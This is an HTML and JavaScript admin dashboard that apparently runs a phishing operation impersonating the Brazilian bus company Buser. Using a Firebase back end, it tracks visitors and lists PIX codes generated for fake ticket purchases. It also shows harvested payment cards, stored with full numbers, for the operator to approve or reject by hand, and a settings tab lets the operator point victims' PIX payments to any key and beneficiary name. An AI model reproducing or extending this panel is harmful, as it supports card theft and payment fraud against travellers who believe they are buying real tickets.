<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Painel Administrativo | Buser</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap">
<style>
  :root{ --brand:#f11075; --grey-dark:#454545; --grey-med:#757575; --grey-light:#e0e0e0; }
  *{box-sizing:border-box}
  body{margin:0;font-family:'Poppins',sans-serif;background:#f0f2f5;color:var(--grey-dark);padding:20px}
  .container{max-width:1200px;margin:0 auto}
  h1{color:var(--brand);font-size:24px;margin-bottom:24px}
  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin-bottom:24px}
  .card{background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,0.05)}
  .card h2{font-size:18px;margin-top:0;margin-bottom:12px;border-bottom:1px solid #eee;padding-bottom:8px}
  .status-badge{display:inline-block;padding:4px 10px;border-radius:20px;font-size:12px;font-weight:600;color:#fff}
  .status-online{background:#40b552}
  .status-offline{background:#999}
  .status-pending{background:#e4ad1c}
  .status-approved{background:#40b552}
  .status-rejected{background:#dc2e36}
  .btn{padding:8px 16px;border:none;border-radius:6px;font-family:'Poppins',sans-serif;font-weight:600;cursor:pointer;font-size:13px;transition:0.2s}
  .btn-primary{background:var(--brand);color:#fff}
  .btn-primary:hover{background:#e70869}
  .btn-danger{background:#dc2e36;color:#fff}
  .btn-success{background:#40b552;color:#fff}
  .btn-sm{padding:4px 10px;font-size:12px}
  .list-item{border-bottom:1px solid #f0f0f0;padding:12px 0;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap}
  .list-item:last-child{border-bottom:none}
  .list-item .info{flex:1;min-width:200px}
  .list-item .info p{margin:2px 0;font-size:13px;color:var(--grey-med)}
  .list-item .info strong{font-size:15px;color:var(--grey-dark)}
  .config-input{width:100%;padding:10px;border:1px solid #ddd;border-radius:6px;font-family:'Poppins';margin-bottom:10px}
  .config-label{font-size:13px;font-weight:600;margin-bottom:4px;display:block;color:var(--grey-dark)}
  .empty-msg{text-align:center;color:#999;padding:20px;font-size:14px}
  .tab-buttons{display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap}
  .tab-btn{padding:8px 20px;border:1px solid #ddd;background:#fff;border-radius:20px;cursor:pointer;font-family:'Poppins';font-weight:600;font-size:14px;transition:0.2s}
  .tab-btn.active{background:var(--brand);color:#fff;border-color:var(--brand)}
  .tab-content{display:none}
  .tab-content.active{display:block}
  .pix-code{background:#f9f9f9;padding:8px;border-radius:4px;font-family:monospace;font-size:11px;word-break:break-all;margin-top:4px}
  .copy-btn{background:#0277bd;color:#fff;border:none;padding:4px 10px;border-radius:4px;cursor:pointer;font-size:11px}
  .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:12px 24px;border-radius:8px;font-size:14px;z-index:9999;opacity:0;transition:opacity 0.3s}
  .toast.show{opacity:1}
</style>
</head>
<body>

<div class="container">
  <h1>Painel Administrativo</h1>

  <div class="tab-buttons">
    <button class="tab-btn active" onclick="switchTab('dashboard')">📊 Dashboard</button>
    <button class="tab-btn" onclick="switchTab('pix')">💰 PIX</button>
    <button class="tab-btn" onclick="switchTab('cartoes')">💳 Cartões</button>
    <button class="tab-btn" onclick="switchTab('config')">⚙️ Configurações</button>
  </div>

  <!-- Dashboard -->
  <div id="tab-dashboard" class="tab-content active">
    <div class="grid">
      <div class="card">
        <h2>👥 Clientes Online</h2>
        <div id="lista-online"><p class="empty-msg">Carregando...</p></div>
      </div>
      <div class="card">
        <h2>📊 Resumo</h2>
        <div id="resumo"><p class="empty-msg">Carregando...</p></div>
      </div>
    </div>
  </div>

  <!-- PIX -->
  <div id="tab-pix" class="tab-content">
    <div class="card">
      <h2>💰 PIX Gerados</h2>
      <div id="lista-pix"><p class="empty-msg">Carregando...</p></div>
    </div>
  </div>

  <!-- Cartões -->
  <div id="tab-cartoes" class="tab-content">
    <div class="card">
      <h2>💳 Cartões Pendentes</h2>
      <div id="lista-cartoes"><p class="empty-msg">Carregando...</p></div>
    </div>
  </div>

  <!-- Configurações -->
  <div id="tab-config" class="tab-content">
    <div class="card">
      <h2>⚙️ Configurações Globais</h2>
      <label class="config-label">Desconto Global (%)</label>
      <input type="number" id="config-desconto" class="config-input" placeholder="Ex: 10" min="0" max="100">
      <label class="config-label">Chave PIX</label>
      <input type="text" id="config-chave" class="config-input" placeholder="CPF, CNPJ, e-mail ou chave aleatória">
      <label class="config-label">Nome do Beneficiário</label>
      <input type="text" id="config-nome" class="config-input" placeholder="Ex: Buser Viagens">
      <label class="config-label">Cidade do Beneficiário</label>
      <input type="text" id="config-cidade" class="config-input" placeholder="Ex: São Paulo">
      <button class="btn btn-primary" onclick="salvarConfig()">Salvar Configurações</button>
    </div>
  </div>
</div>

<div id="toast" class="toast"></div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
<script>
const firebaseConfig = {
  apiKey: "AIzaSyCMoq8MNOUjlhqWhjaJ24uW4grhsFFhA",
  authDomain: "projeto-link-ddbf0.firebaseapp.com",
  databaseURL: "https://projeto-link-ddbf0-default-rtdb.firebaseio.com",
  projectId: "projeto-link-ddbf0",
  storageBucket: "projeto-link-ddbf0.firebasestorage.app",
  messagingSenderId: "560317126646",
  appId: "1:560317126646:web:be9cad9c9ed350940399d7"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const fs = firebase.firestore();

let CONFIG = { descontoGlobal: 0, chavePix: '', nomeBeneficiario: '', cidadeBeneficiario: '' };

// Carregar config
fs.collection("config").doc("global").onSnapshot(snap => {
  if (snap.exists) {
    CONFIG = { ...CONFIG, ...snap.data() };
    document.getElementById('config-desconto').value = CONFIG.descontoGlobal || 0;
    document.getElementById('config-chave').value = CONFIG.chavePix || '';
    document.getElementById('config-nome').value = CONFIG.nomeBeneficiario || '';
    document.getElementById('config-cidade').value = CONFIG.cidadeBeneficiario || '';
  }
});

function salvarConfig() {
  const desconto = parseFloat(document.getElementById('config-desconto').value) || 0;
  const chave = document.getElementById('config-chave').value.trim();
  const nome = document.getElementById('config-nome').value.trim();
  const cidade = document.getElementById('config-cidade').value.trim();
  fs.collection("config").doc("global").set({
    descontoGlobal: desconto,
    chavePix: chave,
    nomeBeneficiario: nome,
    cidadeBeneficiario: cidade
  }).then(() => showToast("Configurações salvas!")).catch(err => alert(err.message));
}

function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 3000);
}

function switchTab(tab) {
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
  document.querySelector(`.tab-btn[onclick="switchTab('${tab}')"]`).classList.add('active');
  document.getElementById('tab-' + tab).classList.add('active');
  if (tab === 'dashboard') carregarOnline();
  if (tab === 'pix') carregarPix();
  if (tab === 'cartoes') carregarCartoes();
}

// ===== CLIENTES ONLINE =====
function carregarOnline() {
  db.ref('visitas').orderByChild('online').equalTo(true).on('value', snap => {
    const container = document.getElementById('lista-online');
    const resumo = document.getElementById('resumo');
    const total = snap.numChildren();
    let html = '';
    if (total === 0) {
      html = '<p class="empty-msg">Nenhum cliente online.</p>';
    } else {
      snap.forEach(child => {
        const data = child.val();
        const tempo = Math.floor((Date.now() - data.entrouEm) / 60000);
        html += `<div class="list-item"><div class="info"><strong>👤 Cliente anônimo</strong><p>Online há ${tempo} min</p></div><span class="status-badge status-online">Online</span></div>`;
      });
    }
    container.innerHTML = html;
    resumo.innerHTML = `<p style="font-size:16px;"><strong>${total}</strong> cliente(s) online agora</p>`;
  });
}

// ===== PIX =====
function carregarPix() {
  fs.collection("pix_gerados").orderBy("timestamp", "desc").limit(50).onSnapshot(snap => {
    const container = document.getElementById('lista-pix');
    if (snap.empty) {
      container.innerHTML = '<p class="empty-msg">Nenhum PIX gerado.</p>';
      return;
    }
    let html = '';
    snap.forEach(doc => {
      const d = doc.data();
      const data = d.timestamp ? d.timestamp.toDate().toLocaleString('pt-BR') : '---';
      const status = d.status || 'pendente';
      const badge = status === 'pendente' ? 'status-pending' : (status === 'pago' ? 'status-approved' : 'status-rejected');
      html += `
        <div class="list-item">
          <div class="info">
            <strong>${d.viagem?.company?.name || 'Viagem'}</strong>
            <p>${d.passageiros?.length || 0} passageiro(s) | Assentos: ${(d.assentos || []).join(', ')}</p>
            <p>Total: R$ ${(d.total || 0).toFixed(2).replace('.', ',')}</p>
            <p>Data: ${data}</p>
            ${d.pixCode ? `<div class="pix-code">${d.pixCode.substring(0, 80)}...</div><button class="copy-btn" onclick="copiarPix('${d.pixCode}')">Copiar PIX</button>` : ''}
          </div>
          <span class="status-badge ${badge}">${status}</span>
        </div>`;
    });
    container.innerHTML = html;
  });
}

function copiarPix(codigo) {
  navigator.clipboard.writeText(codigo).then(() => showToast("PIX copiado!"));
}

// ===== CARTÕES =====
function carregarCartoes() {
  fs.collection("cartoes").where("status", "==", "pendente").orderBy("timestamp", "desc").onSnapshot(snap => {
    const container = document.getElementById('lista-cartoes');
    if (snap.empty) {
      container.innerHTML = '<p class="empty-msg">Nenhum cartão pendente.</p>';
      return;
    }
    let html = '';
    snap.forEach(doc => {
      const d = doc.data();
      const data = d.timestamp ? d.timestamp.toDate().toLocaleString('pt-BR') : '---';
      html += `
        <div class="list-item">
          <div class="info">
            <strong>${d.viagem?.company?.name || 'Viagem'}</strong>
            <p>Passageiros: ${(d.passageiros || []).length} | Total: R$ ${(d.total || 0).toFixed(2).replace('.', ',')}</p>
            <p>Cartão: **** ${(d.cartao?.numero || '').slice(-4)}</p>
            <p>Data: ${data}</p>
          </div>
          <div style="display:flex; gap:8px;">
            <button class="btn btn-success btn-sm" onclick="aprovarCartao('${doc.id}')">Aprovar</button>
            <button class="btn btn-danger btn-sm" onclick="recusarCartao('${doc.id}')">Recusar</button>
          </div>
        </div>`;
    });
    container.innerHTML = html;
  });
}

function aprovarCartao(id) {
  fs.collection("cartoes").doc(id).update({ status: 'aprovado' }).then(() => showToast("Cartão aprovado!"));
}
function recusarCartao(id) {
  fs.collection("cartoes").doc(id).update({ status: 'recusado' }).then(() => showToast("Cartão recusado!"));
}

// Inicializa
carregarOnline();
</script>
</body>
</html>
